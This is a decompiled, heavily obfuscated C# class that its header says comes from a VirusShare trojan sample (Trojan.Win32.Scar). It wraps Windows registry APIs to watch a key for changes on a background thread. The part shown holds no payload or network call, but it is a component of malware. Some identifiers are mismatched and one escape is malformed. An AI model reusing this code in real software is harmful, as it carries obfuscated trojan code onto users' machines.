// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.៰ᷜ཈κ᥀ചᒦᆬʫ
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  public class \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ : IDisposable
  {
    private const int žᏭ\u16EDਔཌᙛ᱁\u0BBBႛѦાᚚሢɑ = 1;
    private const int \u169F᱒ኄ᳸\u009Dᨩ༧ƍᒊΥઇຽڃኈᴄᇳުۣᷡ = 16;
    private const int \u0894\u1393ᱡᕥ\u003B\u0984ဵ\u1B4Dឮᑖʰ = 131072;
    private static readonly IntPtr इᐮøȘ\u0E64୨ၨ\u192Cᆗቤɧ = new IntPtr(int.MinValue);
    private static readonly IntPtr ӊޣᗂᡳዖᆳ̘ྻ = new IntPtr(-2147483647);
    private static readonly IntPtr ᒟᕜ̑ἱᱟ\u1CC2ᙙ\u09F9ጚट8úᱶֻ = new IntPtr(-2147483646);
    private static readonly IntPtr ᆔ\u1AF1Γᮂᖺҹ\u1A9Bᕰᄰᗲ\u109F\u17D8ጁ = new IntPtr(-2147483645);
    private static readonly IntPtr \u087B\u05FFᅂሴᤎᎧḑᴧȧᅅ෦᥏༷ᶽॉȳ = new IntPtr(-2147483644);
    private static readonly IntPtr ޓǭвۣᜥฤۖ = new IntPtr(-2147483643);
    private static readonly IntPtr \u0ECC\u1944Ἤᄠृ\u0BC5ӯ͜ሷણ̤ึฅͭᅓዃᎭ = new IntPtr(-2147483642);
    private IntPtr ጽᚹЫ\u0FD9Ⴎቶᶕ;
    private string ᡶ᳕᥊ᱥጆȢ᠋ʹ\u0E3EᏈș᥌\u0B49ϊᔑᡦᛯᏟ;
    private object \u00B0ఎҩָេऄ\u0606ᬄ = new object();
    private Thread Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ;
    private bool ᤑᨠླྀƬ\u0B04ᠪᰏ\u0AD4ᳩ\u0FCCᏒᜡƎ\u1366അٞṋ;
    private ManualResetEvent ࠨᖢѬܑဃᇏᦳ\u082Fᦱ\u08C1᳸\u0098ू৫Έ᳕\u0F32ଥ = new ManualResetEvent(false);
    private ᵝΔđԁᇚ\u0BD2ᗄህਢ \u1758ᤥരśምᒗા\u1CA8\u0381ຳ = ᵝΔđԁᇚ\u0BD2ᗄህਢ.\u0738\u02D9ᶹፓഛ᱕ڎ৫\u139Dϸиǥᨌ۸ϭᨷᑌᆎ | ᵝΔđԁᇚ\u0BD2ᗄህਢ.Չᑧᘷᢼ႙ણᥨệхᝑᛶܕᱭ | ᵝΔđԁᇚ\u0BD2ᗄህਢ.\u0DE9ဤᙑືേ | ᵝΔđԁᇚ\u0BD2ᗄህਢ.ខе\u12C1༣િө\u1B7D;

    public \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ(RegistryKey registryKey) => this.ᶴᢥොןͧᜃО३\u0AF7(registryKey.Name);

    public \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ(string name)
    {
      switch (name)
      {
        case "":
        case null:
          throw new ArgumentNullException(nameof (name));
        default:
          this.ᶴᢥොןͧᜃО३\u0AF7(name);
          break;
      }
    }

    public \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ(RegistryHive registryHive, string subKey) => this.\u0EBB༾Ἧ۷ᶞ\u1CC5ᝀˠ༣\u08BB᠓ǖᣓமఢټ\u0FE8(registryHive, subKey);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyEx", SetLastError = true)]
    private static extern int ᅎᘜ\u0E8E\u0A29ೆᘳẁ\u0FFE\u0CF4ཙ\u02DEᏞ͓Јࢪཝ\u17DEĵ(
      IntPtr ឧᚎᏨΈϻូᚗġᅛ,
      string _param1,
      uint _param2,
      int _param3,
      out IntPtr _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegNotifyChangeKeyValue", SetLastError = true)]
    private static extern int ͼ\u0092\u0CD1ᖭर۫z(
      IntPtr _param0,
      bool _param1,
      ᵝΔđԁᇚ\u0BD2ᗄህਢ _param2,
      IntPtr ᜇ᪽Ḹྣᙿ᳔ّ,
      bool _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", SetLastError = true)]
    private static extern int \u16FBᵉᦢ\u05CĂ(IntPtr _param0);

    public event EventHandler RegChanged;

    protected virtual void OnRegChanged()
    {
      EventHandler ᆎච᮫ᓂᰞఫၸऐᗰ໔ဣ႖ੰᠳ = this.ᆎච᮫ᓂᰞఫ\u0F02ၸऐᗰ໔ဣ႖\u171Bੰᠳ;
      if (ᆎච᮫ᓂᰞఫၸऐᗰ໔ဣ႖ੰᠳ == null)
        return;
      ᆎච᮫ᓂᰞఫၸऐᗰ໔ဣ႖ੰᠳ((object) this, (EventArgs) null);
    }

    public event ErrorEventHandler Error;

    protected virtual void OnError(Exception _param1)
    {
    }

    public void Dispose()
    {
      this.\u002Eۤᨴνឪց߁ᖽ\u0EFAᩎἉǒ\u0F12ᅲк();
      this.ᤑᨠླྀƬ\u0B04ᠪᰏ\u0AD4ᳩ\u0FCCᏒᜡƎ\u1366അٞṋ = true;
      GC.SuppressFinalize((object) this);
    }

    public ᵝΔđԁᇚ\u0BD2ᗄህਢ ᑛ᳦વᨌᥙ\u0ADBᰪ\u1397Ⴧ\u17DF\u12B7\u0E6Bᱼୀܵձᚑڅᯬ
    {
      get => this.\u1758ᤥരśምᒗા\u1CA8\u0381ຳ;
      set
      {
        lock (this.\u00B0ఎҩָេऄ\u0606ᬄ)
        {
          if (this.ᰐἐ\u19453\u0B53ዛនṥƩडᄁ)
            throw new InvalidOperationException("Monitoring thread is already running");
          this.\u1758ᤥരśምᒗા\u1CA8\u0381ຳ = value;
        }
      }
    }

    private void \u0EBB༾Ἧ۷ᶞ\u1CC5ᝀˠ༣\u08BB᠓ǖᣓமఢټ\u0FE8(RegistryHive _param1, string _param2)
    {
      switch (_param1)
      {
        case RegistryHive.ClassesRoot:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.इᐮøȘ\u0E64୨ၨ\u192Cᆗቤɧ;
          break;
        case RegistryHive.CurrentUser:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ӊޣᗂᡳዖᆳ̘ྻ;
          break;
        case RegistryHive.LocalMachine:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ᒟᕜ̑ἱᱟ\u1CC2ᙙ\u09F9ጚट8úᱶֻ;
          break;
        case RegistryHive.Users:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ᆔ\u1AF1Γᮂᖺҹ\u1A9Bᕰᄰᗲ\u109F\u17D8ጁ;
          break;
        case RegistryHive.PerformanceData:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.\u087B\u05FFᅂሴᤎᎧḑᴧȧᅅ෦᥏༷ᶽॉȳ;
          break;
        case RegistryHive.CurrentConfig:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ޓǭвۣᜥฤۖ;
          break;
        case RegistryHive.DynData:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.\u0ECC\u1944Ἤᄠृ\u0BC5ӯ͜ሷણ̤ึฅͭᅓዃᎭ;
          break;
        default:
          throw new InvalidEnumArgumentException("hive", (int) _param1, typeof (RegistryHive));
      }
      this.ᡶ᳕᥊ᱥጆȢ᠋ʹ\u0E3EᏈș᥌\u0B49ϊᔑᡦᛯᏟ = _param2;
    }

    private void ᶴᢥොןͧᜃО३\u0AF7(string _param1)
    {
      string[] strArray = _param1.Split('\\');
      switch (strArray[0])
      {
        case "HKEY_CLASSES_ROOT":
        case "HKCR":
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.इᐮøȘ\u0E64୨ၨ\u192Cᆗቤɧ;
          break;
        case "HKEY_CURRENT_USER":
        case "HKCU":
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ӊޣᗂᡳዖᆳ̘ྻ;
          break;
        case "HKEY_LOCAL_MACHINE":
        case "HKLM":
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ᒟᕜ̑ἱᱟ\u1CC2ᙙ\u09F9ጚट8úᱶֻ;
          break;
        case "HKEY_USERS":
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ᆔ\u1AF1Γᮂᖺҹ\u1A9Bᕰᄰᗲ\u109F\u17D8ጁ;
          break;
        case "HKEY_CURRENT_CONFIG":
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ޓǭвۣᜥฤۖ;
          break;
        default:
          this.ጽᚹЫ\u0FD9Ⴎቶᶕ = IntPtr.Zero;
          throw new ArgumentException("The registry hive '" + strArray[0] + "' is not supported", "value");
      }
      this.ᡶ᳕᥊ᱥጆȢ᠋ʹ\u0E3EᏈș᥌\u0B49ϊᔑᡦᛯᏟ = string.Join("\\", strArray, 1, strArray.Length - 1);
    }

    public bool ᰐἐ\u19453\u0B53ዛនṥƩडᄁ => this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ != null;

    public void ᤘ\u0FE0ᙴ\u1ACCΒҦ\u0E71ጷᕠ\u0A76Ĺ()
    {
      if (this.ᤑᨠླྀƬ\u0B04ᠪᰏ\u0AD4ᳩ\u0FCCᏒᜡƎ\u1366അٞṋ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.\u00B0ఎҩָេऄ\u0606ᬄ)
      {
        if (this.ᰐἐ\u19453\u0B53ዛនṥƩडᄁ)
          return;
        this.ࠨᖢѬܑဃᇏᦳ\u082Fᦱ\u08C1᳸\u0098ू৫Έ᳕\u0F32ଥ.Reset();
        this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ = new Thread(new ThreadStart(this.\u0E4AᖚǪᖦᑳᶄୟᄯ\u1CCFၖ));
        this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ.IsBackground = true;
        this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ.Start();
      }
    }

    public void \u002Eۤᨴνឪց߁ᖽ\u0EFAᩎἉǒ\u0F12ᅲк()
    {
      if (this.ᤑᨠླྀƬ\u0B04ᠪᰏ\u0AD4ᳩ\u0FCCᏒᜡƎ\u1366അٞṋ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.\u00B0ఎҩָេऄ\u0606ᬄ)
      {
        Thread ӫᵥᳬቀ᪅ᄺြଣ৭ːȴ = this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ;
        if (ӫᵥᳬቀ᪅ᄺြଣ৭ːȴ == null)
          return;
        this.ࠨᖢѬܑဃᇏᦳ\u082Fᦱ\u08C1᳸\u0098ू৫Έ᳕\u0F32ଥ.Set();
        ӫᵥᳬቀ᪅ᄺြଣ৭ːȴ.Join();
      }
    }

    private void \u0E4AᖚǪᖦᑳᶄୟᄯ\u1CCFၖ()
    {
      try
      {
        this.ч\u17F1ᑊܞᛖᯋ();
      }
      catch (Exception ex)
      {
        this.OnError(ex);
      }
      this.Ӫ\u061Bᵥᳬቀ᪅ᄺ\u1A9Eြ\u1C7Eଣ৭\u001Dː\u19FDȴ = (Thread) null;
    }

    private void ч\u17F1ᑊܞᛖᯋ()
    {
      IntPtr num;
      int error1 = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ᅎᘜ\u0E8E\u0A29ೆᘳẁ\u0FFE\u0CF4ཙ\u02DEᏞ͓Јࢪཝ\u17DEĵ(this.ጽᚹЫ\u0FD9Ⴎቶᶕ, this.ᡶ᳕᥊ᱥጆȢ᠋ʹ\u0E3EᏈș᥌\u0B49ϊᔑᡦᛯᏟ, 0U, 131089, out num);
      if (error1 != 0)
        throw new Win32Exception(error1);
      try
      {
        AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        WaitHandle[] waitHandles = new WaitHandle[2]
        {
          (WaitHandle) autoResetEvent,
          (WaitHandle) this.ࠨᖢѬܑဃᇏᦳ\u082Fᦱ\u08C1᳸\u0098ू৫Έ᳕\u0F32ଥ
        };
        while (!this.ࠨᖢѬܑဃᇏᦳ\u082Fᦱ\u08C1᳸\u0098ू৫Έ᳕\u0F32ଥ.WaitOne(0, true))
        {
          int error2 = \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.ͼ\u0092\u0CD1ᖭर۫z(num, true, this.\u1758ᤥരśምᒗા\u1CA8\u0381ຳ, autoResetEvent.SafeWaitHandle.DangerousGetHandle(), true);
          if (error2 != 0)
            throw new Win32Exception(error2);
          if (WaitHandle.WaitAny(waitHandles) == 0)
            this.OnRegChanged();
        }
      }
      finally
      {
        if (num != IntPtr.Zero)
          \u17F0ᷜ\u0F48κ\u1940ചᒦᆬʫ.\u16FBᵉᦢ\u05CĂ(num);
      }
    }
  }
}
